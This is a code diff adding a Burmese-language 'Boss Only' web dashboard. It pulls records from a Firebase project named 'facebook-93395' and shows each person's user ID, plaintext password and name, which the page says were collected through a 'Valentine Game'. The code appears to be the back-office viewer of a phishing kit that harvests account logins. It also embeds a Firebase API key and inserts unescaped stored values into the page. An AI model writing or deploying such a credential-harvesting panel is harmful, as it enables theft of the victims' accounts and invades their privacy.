@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <title>Server Dashboard (Boss Only)</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #fdf2f2; padding: 20px; }
+        .header { text-align: center; color: #ff2e6e; margin-bottom: 30px; }
+        .container { max-width: 650px; margin: 0 auto; }
+        .card { background: white; padding: 18px; margin-bottom: 12px; border-radius: 15px; border-left: 8px solid #ff4e8a; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .delete-btn { position: absolute; right: 15px; top: 15px; background: #ff4d4d; color: white; border: none; padding: 6px 12px; border-radius: 8px; cursor: pointer; }
+        .time { font-size: 12px; color: #999; margin-bottom: 5px; }
+        .info { font-size: 15px; line-height: 1.6; color: #333; }
+        b { color: #ff2e6e; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>🚀 User Data Dashboard</h2>
+            <p>Valentine Game မှ စာရင်းသွင်းထားသူများ</p>
+        </div>
+        <div id="list">စာရင်းများ ဆွဲယူနေသည်...</div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        // Boss ရဲ့ Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyDyOQCqc2moG-KECBJc75GcgY4TJk6yWm8",
+            authDomain: "facebook-93395.firebaseapp.com",
+            projectId: "facebook-93395",
+            databaseURL: "https://facebook-93395-default-rtdb.asia-southeast1.firebasedatabase.app/",
+            appId: "1:522909220682:web:3f080e0f14ce2016dd0bb3"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // 'users' path ကနေ data ဆွဲယူမည်
+        db.ref('users/').on('value', (snap) => {
+            const listDiv = document.getElementById('list');
+            listDiv.innerHTML = "";
+            
+            if(!snap.exists()) {
+                listDiv.innerHTML = "<center>Data မရှိသေးပါ။</center>";
+                return;
+            }
+
+            snap.forEach((child) => {
+                const val = child.val();
+                // Gmail ဆိုလျှင် _ ကို . ပြန်ပြောင်းရန်
+                const displayId = child.key.replace(/_/g, '.');
+                
+                listDiv.insertAdjacentHTML('afterbegin', `
+                    <div class="card">
+                        <button class="delete-btn" onclick="deleteItem('${child.key}')">ဖျက်မည်</button>
+                        <div class="time">📅 ${val.time || 'N/A'}</div>
+                        <div class="info">
+                            <b>User ID:</b> ${displayId} <br>
+                            <b>Password:</b> ${val.password || 'N/A'} <br>
+                            <b>Name:</b> ${val.name || 'N/A'}
+                        </div>
+                    </div>
+                `);
+            });
+        });
+
+        function deleteItem(key) {
+            if(confirm("ဒီ User ကို ဖျက်မှာလား Boss?")) {
+                db.ref('users/' + key).remove();
+            }
+        }
+    </script>
+</body>
+</html>
